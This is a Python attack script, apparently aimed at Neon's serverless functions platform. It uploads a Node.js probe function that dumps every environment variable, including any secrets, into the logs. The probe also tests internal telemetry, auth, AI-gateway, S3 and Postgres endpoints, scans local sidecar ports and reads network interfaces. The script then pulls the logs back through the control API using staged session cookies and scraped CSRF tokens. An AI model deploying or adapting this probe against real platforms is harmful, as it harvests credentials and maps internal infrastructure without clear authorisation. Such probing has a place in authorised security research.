# -*- coding: utf-8 -*-
"""函数运行时深度探测 #2:
1. env 全值(分段 log)
2. 内部端点:telemetry/load/data/auth-jwks/AI-gateway 连通性 + 响应
3. S3 端点 list(自己 creds scope)
4. 本地端口面(LOAD_PORT/DATA_PORT)"""
import http.client, ssl, json, re, html, os, sys, time, io, zipfile, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
PID, BID = ctxj['pid'], ctxj['bid']

def ctl_req(method, path, body=None, ctype='application/json', raw_body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie_str().split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if ctype:
        hdrs['Content-Type'] = ctype
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    data = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn3.request(method, path, body=data, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

PROBE = r'''const sleep = (ms) => new Promise(r => setTimeout(r, ms));
async function t(url, ms, opts) {
  try {
    const r = await fetch(url, Object.assign({ signal: AbortSignal.timeout(ms), redirect: 'follow' }, opts || {}));
    const tx = await r.text();
    return r.status + ' ct=' + (r.headers.get('content-type') || '') + ' ' + tx.slice(0, 600).replace(/\s+/g, ' ');
  } catch (e) { return 'ERR ' + (e && e.message ? e.message : e); }
}
function log(k, v) {
  const s = JSON.stringify(v);
  for (let i = 0; i < s.length; i += 900) { console.log('P2 ' + k + ' ' + s.slice(i, i + 900)); }
}
async function probe() {
  await sleep(1000);
  const e = process.env;
  log('ENVALL', e);
  // 内部端点连通性
  const targets = [
    ['TELEMETRY', e.NEON_TELEMETRY_ENDPOINT, 6000],
    ['AUTH_JWKS', e.NEON_AUTH_JWKS_URL, 6000],
    ['AUTH_BASE', e.NEON_AUTH_BASE_URL, 6000],
    ['AI_GW', e.NEON_AI_GATEWAY_BASE_URL, 6000],
    ['DATA_API', e.NEON_DATA_API_URL, 6000],
    ['S3', e.AWS_ENDPOINT_URL_S3, 6000],
    ['PG_HOST', 'https://' + e.PGHOST + ':443/', 5000],
  ];
  for (const [k, u, ms] of targets) {
    if (!u) { console.log('P2 ' + k + ' empty'); continue; }
    const url = /^https?:/.test(u) ? u : 'http://' + u;
    console.log('P2 ' + k + ' ' + url + ' => ' + await t(url, ms));
  }
  // 本地端口面:LOAD_PORT/DATA_PORT 是本地 sidecar?
  for (const [k, p] of [['LOAD', e.NEON_LOAD_PORT], ['DATA', e.NEON_DATA_PORT]]) {
    if (!p) continue;
    for (const host of ['127.0.0.1', 'localhost']) {
      console.log('P2 ' + k + ' http://' + host + ':' + p + '/ => ' + await t('http://' + host + ':' + p + '/', 4000));
      console.log('P2 ' + k + ' tcp ' + host + ':' + p);
    }
  }
  // 函数内解析自身主机名
  try {
    const os = await import('node:os');
    console.log('P2 hostname=' + os.hostname() + ' ifaces=' + JSON.stringify(os.networkInterfaces()).slice(0, 800));
  } catch (e) { console.log('P2 os ERR ' + e.message); }
  console.log('P2 done');
}
probe();
export default { fetch: async (req) => new Response('ok') };
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.js', PROBE)
    z.writestr('package.json', '{"name":"probe2","type":"module","main":"index.js"}')
buf.seek(0)
zip_bytes = buf.read()

SLUG = 'secprb2' + uuid.uuid4().hex[:6]
FP = '/projects/%s/branches/%s/functions' % (PID, BID)
boundary = '----b' + uuid.uuid4().hex
body = (('--' + boundary + '\r\nContent-Disposition: form-data; name="zip"; filename="b.zip"\r\nContent-Type: application/zip\r\n\r\n').encode()
        + zip_bytes + b'\r\n'
        + ('--' + boundary + '\r\nContent-Disposition: form-data; name="runtime"\r\n\r\nnodejs24\r\n').encode()
        + ('--' + boundary + '--\r\n').encode())
st, raw = ctl_req('POST', API_BASE + FP + '/' + SLUG + '/deployments', None,
                  ctype='multipart/form-data; boundary=' + boundary, raw_body=body)
print('deploy -> %d %s' % (st, raw[:250]), flush=True)

seen = set()
for i in range(18):
    time.sleep(5)
    st2, raw2 = ctl_req('POST', API_BASE + '/projects/%s/branches/%s/logs/query' % (PID, BID),
                        {'since': '5m', 'body_contains': 'P2 '})
    try:
        for lg in json.loads(raw2).get('logs', []):
            msg = lg.get('message') or lg.get('line') or str(lg)
            if isinstance(msg, str) and msg.startswith('P2 ') and msg not in seen:
                seen.add(msg)
                print('LOG: %s' % msg[:1100], flush=True)
    except Exception:
        pass
    if 'P2 done' in ' '.join(seen):
        break
print('rows:', len(seen), flush=True)

st, raw = ctl_req('DELETE', API_BASE + FP + '/' + SLUG)
print('cleanup -> %d' % st, flush=True)
